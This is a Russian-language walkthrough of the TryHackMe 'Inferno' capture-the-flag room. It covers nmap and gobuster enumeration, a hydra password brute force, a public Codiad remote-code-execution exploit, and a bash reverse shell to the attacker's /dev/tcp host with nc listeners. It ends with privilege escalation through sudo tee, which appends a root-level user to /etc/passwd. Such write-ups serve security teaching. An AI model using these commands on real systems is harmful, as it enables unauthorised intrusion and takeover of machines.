# Inferno

:white_check_mark:  [**Hydra**](#hydra)

:white_check_mark: [**Codiad**](#codiad)

:white_check_mark: [**Openssl**](#openssl)

:white_check_mark: [**Tee**](#tee)
___

## Enumeration
Сканируем ip командой:
```
nmap -sC -sV inferno.thm
```

```
PORT      STATE SERVICE       REASON  VERSION
21/tcp    open  tcpwrapped    syn-ack
22/tcp    open  ssh           syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBR1uDh8+UHIoUl3J5AJApSgrmxFtvWtauxjTLxH9B5s9E0SThz3fljXo7uSL+2hjphfHyqrdAxoCGQJgRn/o5xGDSpoSoORBIxv1LVaZJlt/eIEhjDP48NP9l/wTRki9zZl5sNVyyyy/lobAj6BYH+dU3g++2su9Wcl0wmFChG5B2Kjrd9VSr6TC0XJpGfQxu+xJy29XtoTzKEiZCoLz3mZT7UqwsSgk38aZjEMKP9QDc0oa5v4JmKy4ikaR90CAcey9uIq8YQtSj+US7hteruG/HLo1AmOn9U3JAsVTd4vI1kp+Uu2vWLaWWjhfPqvbKEV/fravKSPd0EQJmg1eJ
|   256 de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKFhVdH50NAu45yKvSeeMqyvWl1aCZ1wyrHw2MzGY5DVosjZf/rUzrdDRS0u9QoIO4MpQAvEi7w7YG7zajosRN8=
|   256 e2:6d:8d:e1:a8:d0:bd:97:cb:9a:bc:03:c3:f8:d8:85 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAdzynTIlsSkYKaqfCAdSx5J2nfdoWFw1FcpKFIF8LRv
23/tcp    open  tcpwrapped    syn-ack
25/tcp    open  tcpwrapped    syn-ack
|_smtp-commands: Couldn't establish connection on port 25
80/tcp    open  http          syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Dante's Inferno
88/tcp    open  tcpwrapped    syn-ack
106/tcp   open  pop3pw?       syn-ack
110/tcp   open  tcpwrapped    syn-ack
389/tcp   open  tcpwrapped    syn-ack
464/tcp   open  tcpwrapped    syn-ack
636/tcp   open  tcpwrapped    syn-ack
777/tcp   open  tcpwrapped    syn-ack
783/tcp   open  tcpwrapped    syn-ack
808/tcp   open  ccproxy-http? syn-ack
873/tcp   open  tcpwrapped    syn-ack
1001/tcp  open  webpush?      syn-ack
1236/tcp  open  tcpwrapped    syn-ack
1300/tcp  open  tcpwrapped    syn-ack
2000/tcp  open  tcpwrapped    syn-ack
2003/tcp  open  tcpwrapped    syn-ack
2121/tcp  open  tcpwrapped    syn-ack
2601/tcp  open  tcpwrapped    syn-ack
2602/tcp  open  tcpwrapped    syn-ack
2604/tcp  open  tcpwrapped    syn-ack
2605/tcp  open  tcpwrapped    syn-ack
2607/tcp  open  tcpwrapped    syn-ack
2608/tcp  open  tcpwrapped    syn-ack
4224/tcp  open  tcpwrapped    syn-ack
5051/tcp  open  tcpwrapped    syn-ack
5432/tcp  open  tcpwrapped    syn-ack
5555/tcp  open  tcpwrapped    syn-ack
5666/tcp  open  tcpwrapped    syn-ack
6346/tcp  open  tcpwrapped    syn-ack
6566/tcp  open  tcpwrapped    syn-ack
6667/tcp  open  tcpwrapped    syn-ack
|_irc-info: Unable to open connection
8021/tcp  open  tcpwrapped    syn-ack
8081/tcp  open  tcpwrapped    syn-ack
|_mcafee-epo-agent: ePO Agent not found
8088/tcp  open  radan-http?   syn-ack
9418/tcp  open  tcpwrapped    syn-ack
10000/tcp open  tcpwrapped    syn-ack
10082/tcp open  tcpwrapped    syn-ack
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Главная страница **inferno.thm** выглядит так:

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Inferno/1.png)

Сканируем директории командой:
```
gobuster dir -u http://inferno.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://inferno.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/20 16:00:18 Starting gobuster in directory enumeration mode
===============================================================
/inferno              (Status: 401) [Size: 458]
```

Перейдем в директорию **/inferno**. Появляется окно авторизации.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Inferno/2.png)

<a name="hydra"></a>

При помощи утилиты **hydra** попробует перебрать пароля для стандартных имен пользователей. Попробуем имя пользователя "admin"
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt -f inferno.thm http-get /inferno/ -t 64
```

```
[80][http-get] host: inferno.thm   login: admin   password: dante1
```

Вводим найденные учетные данные. Нас перекидывает на другую страницу авторизации. Попробуем те же данные(admin:dante1).

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Inferno/3.png)

<a name="codiad"></a>

Получаем панель админа.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Inferno/4.png)

Попробуем найти в интернете эксплоит для **codiad**. Скачаем [эксплоит](https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit) и проэксплуатируем.
```
python exploit.py http://admin:dante1@inferno.thm/inferno/ admin dante1 <Твой IP> <Порт> linux
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Inferno/5.png)

Для того, чтобы получить оболочку нужно использовать еще две команды, которые нам предлагает ввести эксплоит.
```
echo 'bash -c "bash -i >/dev/tcp/<Твой ip>/<Твой порт> 0>&1 2>&1"' | nc -lvnp <Твой порт>

nc -lvnp <(Твой порт) + 1>
```

Получаем оболочку, стабилизируем ее.
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Inferno/6.png)

В домашней директории пользователя находит интересный файл **/home/dante/Downloads/.download.dat**. В нем лежит зашифрованный текст. Расшифруем его с помощью [Cyberchef](https://gchq.github.io/CyberChef/). Получим текст, в котором лежит пароль от пользователя.
```
«Or se’ tu quel Virgilio e quella fonte
che spandi di parlar sì largo fiume?»,
rispuos’io lui con vergognosa fronte.

«O de li altri poeti onore e lume,
vagliami ’l lungo studio e ’l grande amore
che m’ha fatto cercar lo tuo volume.

Tu se’ lo mio maestro e ’l mio autore,
tu se’ solo colui da cu’ io tolsi
lo bello stilo che m’ha fatto onore.

Vedi la bestia per cu’ io mi volsi;
aiutami da lei, famoso saggio,
ch’ella mi fa tremar le vene e i polsi».

dante:V1rg1l10h3lpm3
```

<a name="tee"></a>

Подключаемся по shh. Посмотрим права пользователя командой **sudo -l**.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Inferno/7.png)

```
Matching Defaults entries for dante on Inferno:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dante may run the following commands on Inferno:
    (root) NOPASSWD: /usr/bin/tee
```

На [GTFOBins](https://gtfobins.github.io/gtfobins/tee/) найдем нужный эксплоит.

```
LFILE=file_to_write
echo DATA | sudo tee -a "$LFILE"
```

<a name="openssl"></a>

Модифицируем его. Для начала, создадим нового пользователя и впишем его в **/etc/passwd**.
```
openssl passwd -1 -salt toor toor

$1$toor$2SrtV0M1RHrAj9uQL5C7w/
```

Модифицированный эксплоит:
```
echo "toor:\$1\$toor\$2SrtV0M1RHrAj9uQL5C7w/:0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd
```

Заходим под нового пользователя.
```
su toor
```

Получаем флаг.
